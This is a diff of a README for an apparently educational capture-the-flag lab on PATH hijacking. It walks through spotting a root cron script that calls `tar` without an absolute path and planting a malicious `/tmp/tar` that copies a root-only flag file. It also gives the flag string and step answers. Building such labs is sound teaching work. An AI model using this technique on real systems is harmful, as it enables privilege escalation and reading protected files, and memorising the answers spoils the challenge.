@@ -1,51 +1,81 @@
-# PATH Hijacking Challenge — Guided Terminal CTF (Intermediate)
+# PATH Hijacking Challenge
 
-## Context
-You are a pentester for TechCorp. An internal server runs a backup script as `root` via cron.
-Your mission is to exploit a `PATH` misconfiguration to execute your own binary and read a root-only flag.
+## Goal
 
-## Objective
-Capture the flag located at:
-- `/root/flag.txt`
+Exploit a root cron job that trusts `PATH`, then read:
 
-After exploitation, the flag must be retrievable here (readable by `student`):
-- `/opt/output/flag.txt`
+```text
+FLAG{path_hijacking_pwned_2026}
+```
 
-## What you will learn
-- How to read and understand cron jobs (`/etc/crontab`)
-- How command resolution works via `PATH`
-- How to spot a dangerous privileged script calling a command without an absolute path
-- How to exploit PATH hijacking to escalate privileges (via root cron)
+The flag is copied to:
 
-## Run the lab
+```text
+/opt/output/flag.txt
+```
 
-### Build
+## Platform Session
+
+Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.
+
+## Step 1. Identify The Root Cron Script
+
+Read system cron entries:
+
 ```bash
-docker build -t altair-path-hijacking:v1 .
-```
-### Run
-```bash
-docker run --rm -it --name path-hijack altair-path-hijacking:v1
-```
-### Execute 
-```bash
-docker exec -it path-hijack bash -lc 'exec su - student'
+cat /etc/crontab
 ```
 
-## Solution
+Find the root job that executes:
 
+```text
+/opt/backup.sh
 ```
-cat /etc/crontab | grep root
+
+Submit for step 1:
+
+```text
+/opt/backup.sh
+```
+
+## Step 2. Find The PATH Hijack Target
+
+Inspect the script:
+
+```bash
 cat /opt/backup.sh
+```
 
+The script calls `tar` without an absolute path.
+
+Submit for step 2:
+
+```text
+tar
+```
+
+## Step 3. Create A Malicious `tar`
+
+Create a fake `tar` earlier in root cron's `PATH`:
+
+```bash
 cat > /tmp/tar <<'EOF'
 #!/bin/bash
 cat /root/flag.txt > /opt/output/flag.txt
 chmod 644 /opt/output/flag.txt
 EOF
 chmod +x /tmp/tar
+```
 
+Wait for cron to run:
+
+```bash
 sleep 70
 cat /opt/output/flag.txt
+```
 
+Submit:
+
+```text
+FLAG{path_hijacking_pwned_2026}
 ```
